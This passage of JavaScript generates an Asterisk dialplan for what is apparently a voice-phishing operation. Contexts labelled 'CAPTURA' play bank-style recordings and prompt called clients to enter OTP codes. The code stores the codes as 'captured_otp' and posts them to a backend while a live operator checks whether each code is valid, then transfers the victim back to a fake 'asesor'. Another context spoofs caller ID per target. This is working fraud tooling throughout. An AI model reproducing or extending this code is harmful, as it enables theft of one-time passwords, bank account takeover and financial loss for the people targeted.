  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?codigo_aprobado)\n`;
  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?codigo_rechazado)\n`;
  dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 60]?codigo_aprobado)\n`;
  dialplanContent += ` same => n,ExecIf($[$[\${WAIT_LOOP} % 5] = 0]?Playback(beep))\n`;
  dialplanContent += ` same => n,Wait(1)\n`;
  dialplanContent += ` same => n,Goto(bucle_espera_decision)\n\n`;
  dialplanContent += ` same => n(codigo_aprobado),NoOp(=== [CAPTURA-4444] TOKEN APROBADO: CONECTANDO DE VUELTA CON EL ASESOR \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/4444)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/last)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/global)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=done)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
  dialplanContent += ` same => n,Wait(0.5)\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;
  dialplanContent += ` same => n(codigo_rechazado),NoOp(=== [CAPTURA-4444] TOKEN INVALIDO -> REINTENTANDO ===)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/4444)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/last)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/global)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
  dialplanContent += ` same => n,Goto(pedir_codigo)\n\n`;
  dialplanContent += `exten => h,1,NoOp(=== [CAPTURA-4444 HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=ended&cause=\${HANGUPCAUSE}&channel=\${CHANNEL}" &)\n\n`;

  // --- CONTEXTO CAPTURA EN VIVO EXTENSIÓN 5555 ---
  dialplanContent += `; ========================================================\n`;
  dialplanContent += `; CONTEXTO CAPTURA EN VIVO EXTENSION 5555\n`;
  dialplanContent += `; Mismas funciones que la 7777 pero con soporte de audios propios (5555_intro, etc.)\n`;
  dialplanContent += `; ========================================================\n`;
  dialplanContent += `[ivr-otp-live-5555]\n`;
  dialplanContent += `exten => s,1,Goto(ivr-captura-vivo-5555,s,1)\n\n`;
  dialplanContent += `[ivr-captura-vivo-5555]\n`;
  dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-5555] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${LAST_AGENT}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${CALLING_AGENT}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/5555)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/7777)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/8888)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-5555] Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Set(AUDIO_5555=\${DB(ivr_vars/5555_prompt)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_5555}" = ""]?Set(AUDIO_5555=\${DB(ivr_vars/5555_intro)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_5555}" = ""]?Set(AUDIO_5555=\${DB(ivr_vars/welcome_5555)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_5555}" = ""]?Set(AUDIO_5555=\${DB(ivr_vars/7777_prompt)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_5555}" = ""]?Set(AUDIO_5555=\${DB(ivr_vars/7777_intro)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_5555}" = ""]?Set(AUDIO_5555=\${DB(ivr_vars/\${TARGET_DEST}_prompt)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_5555}" = ""]?Set(AUDIO_5555=custom/solicitar_codigo_otp))\n`;
  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/5555_wait)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/7777_wait)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=custom/un_momento_validando_informacion))\n`;
  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/5555_success)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/7777_success)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=custom/operacion_bloqueada_exito))\n`;
  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/5555_failure)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/7777_failure)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=custom/token_invalido_reintente))\n`;
  dialplanContent += ` same => n,Set(RETRY_COUNT=0)\n`;
  dialplanContent += ` same => n(pedir_codigo),Set(RETRY_COUNT=$[\${RETRY_COUNT} + 1])\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-5555] Solicitando Codigo OTP (Intento \${RETRY_COUNT}) con audio: \${AUDIO_5555} ===)\n`;
  dialplanContent += ` same => n,Set(USER_DIGITS=)\n`;
  dialplanContent += ` same => n,Read(USER_DIGITS,\${AUDIO_5555},10,,2,15)\n`;
  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo)\n`;
  dialplanContent += ` same => n,Playback(beep)\n`;
  dialplanContent += ` same => n,GotoIf($[\${RETRY_COUNT} < 3]?pedir_codigo)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},30,Tt)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;
  dialplanContent += ` same => n(evaluar_codigo),NoOp(=== [CAPTURA-5555] DIGITOS RECIBIDOS DEL CLIENTE: \${USER_DIGITS} ===)\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/\${TARGET_DEST})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/\${CALLERID(num)})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/5555)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/7777)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/8888)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/last)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/global)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/5555)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/last)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/global)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&otp=\${USER_DIGITS}&agent=\${FINAL_AGENT}&exten=5555&channel=\${CHANNEL}" &)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_WAIT})\n`;
  dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
  dialplanContent += ` same => n(bucle_espera_decision),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
  dialplanContent += ` same => n,Set(RAW_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${USER_DIGITS})}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/5555)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/7777)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/8888)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/last)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/global)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_last_status)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_decision)}))\n`;
  dialplanContent += ` same => n,Set(CURRENT_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${RAW_STATUS})})})\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-5555] Ciclo \${WAIT_LOOP}/60 - Estado: \${CURRENT_STATUS} (Dest: \${TARGET_DEST}, CID: \${CALLERID(num)}, Code: \${USER_DIGITS}) ===)\n`;
  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?codigo_aprobado)\n`;
  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?codigo_rechazado)\n`;
  dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 60]?codigo_aprobado)\n`;
  dialplanContent += ` same => n,ExecIf($[$[\${WAIT_LOOP} % 5] = 0]?Playback(beep))\n`;
  dialplanContent += ` same => n,Wait(1)\n`;
  dialplanContent += ` same => n,Goto(bucle_espera_decision)\n\n`;
  dialplanContent += ` same => n(codigo_aprobado),NoOp(=== [CAPTURA-5555] TOKEN APROBADO: CONECTANDO DE VUELTA CON EL ASESOR \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/5555)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/last)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/global)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=done)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
  dialplanContent += ` same => n,Wait(0.5)\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;
  dialplanContent += ` same => n(codigo_rechazado),NoOp(=== [CAPTURA-5555] TOKEN INVALIDO -> REINTENTANDO ===)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/5555)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/last)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/global)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
  dialplanContent += ` same => n,Goto(pedir_codigo)\n\n`;
  dialplanContent += `exten => h,1,NoOp(=== [CAPTURA-5555 HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=ended&cause=\${HANGUPCAUSE}&channel=\${CHANNEL}" &)\n\n`;

  dialplanContent += `; ========================================================\n`;
  dialplanContent += `; CONTEXTO DEDICADO PRESS-1: RESPUESTA ULTRA-RAPIDA AL 1\n`;
  dialplanContent += `; ========================================================\n`;
  dialplanContent += `[ivr-press1]\n`;
  dialplanContent += `exten => s,1,NoOp(=== [IVR-PRESS1] INICIO MODO PRESS 1 ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,NoOp(=== [IVR-PRESS1] ESPERANDO 1.5 SEGUNDOS DE PAUSA NATURAL ANTES DEL AUDIO ===)\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
  dialplanContent += ` same => n,Set(TIMEOUT(response)=4)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,Set(IVR_INTRO=\${DB(ivr_vars/\${TARGET_DEST}_intro)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/8888_intro)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/default_intro)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/bienvenida_press1))\n`;
  dialplanContent += ` same => n(menu),Background(\${IVR_INTRO})\n`;
  dialplanContent += ` same => n,WaitExten(4)\n`;
  dialplanContent += ` same => n,Goto(menu)\n\n`;

  dialplanContent += `; CUANDO EL CLIENTE PRESIONA 1: ESPERA 2 SEGUNDOS DE PAUSA NATURAL Y LUEGO MENSAJE DE TRANSFERENCIA AL ASESOR\n`;
  dialplanContent += `exten => 1,1,NoOp(=== [IVR-PRESS1] DIGITO 1 DETECTADO -> ESPERANDO 2 SEGUNDOS DE PAUSA NATURAL ===)\n`;
  dialplanContent += ` same => n,Wait(2)\n`;
  dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${DB(ivr_vars/default_agent)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))\n`;
  dialplanContent += ` same => n,Playback(\${IVR_AGENT})\n`;
  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,Set(__LAST_AGENT=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/7777)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/6666)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/\${TARGET_DEST})=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Set(DB(ivr_vars/global_agent_exten)=\${FINAL_AGENT})\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;

  dialplanContent += `exten => i,1,Playback(custom/opcion_invalida)\n`;
  dialplanContent += ` same => n,Goto(s,menu)\n\n`;
  dialplanContent += `exten => t,1,Goto(s,menu)\n\n`;

  dialplanContent += `exten => h,1,NoOp(=== [IVR-PRESS1 HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=ended&cause=\${HANGUPCAUSE}&channel=\${CHANNEL}" &)\n\n`;

  dialplanContent += `[ivr-otp]\n`;
  dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
  dialplanContent += ` same => n,NoOp(=== [IVR-OTP] ESPERANDO 1.5 SEGUNDOS DE PAUSA NATURAL ANTES DEL AUDIO ===)\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
  dialplanContent += ` same => n,Set(TIMEOUT(response)=4)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
  dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${TARGET_DEST}_cid_num)})\n`;
  dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${TARGET_DEST}_cid_name)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
  dialplanContent += ` same => n,Set(IVR_INTRO=\${DB(ivr_vars/\${TARGET_DEST}_intro)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/8888_intro)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/default_intro)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/global_intro)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${GLOBAL_DEFAULT_INTRO}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/bienvenida_corporativa))\n`;

  dialplanContent += ` same => n,Set(IVR_PROMPT=\${DB(ivr_vars/\${TARGET_DEST}_prompt)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/8888_prompt)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/default_prompt)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/global_prompt)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${GLOBAL_DEFAULT_PROMPT}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=custom/solicitar_codigo_otp))\n`;

  dialplanContent += ` same => n,Set(IVR_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${DB(ivr_vars/8888_wait)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${DB(ivr_vars/default_wait)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${GLOBAL_DEFAULT_WAIT}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=custom/un_momento_validando_informacion))\n`;

  dialplanContent += ` same => n,Set(IVR_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${DB(ivr_vars/8888_success)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${DB(ivr_vars/default_success)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${GLOBAL_DEFAULT_SUCCESS}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=custom/operacion_bloqueada_exito))\n`;

  dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${DB(ivr_vars/default_agent)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${GLOBAL_DEFAULT_AGENT}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))\n`;

  dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT_EXTEN}" = ""]?Set(IVR_AGENT_EXTEN=1001))\n`;
  dialplanContent += ` same => n,Set(IVR_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_FAILURE}" = ""]?Set(IVR_FAILURE=\${DB(ivr_vars/8888_failure)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_FAILURE}" = ""]?Set(IVR_FAILURE=\${DB(ivr_vars/default_failure)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_FAILURE}" = ""]?Set(IVR_FAILURE=custom/token_invalido_reintente))\n`;
  dialplanContent += ` same => n,Set(IVR_INVALID=\${DB(ivr_vars/\${TARGET_DEST}_invalid)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${IVR_INVALID}" = ""]?Set(IVR_INVALID=\${DB(ivr_vars/8888_invalid)}))\n`;
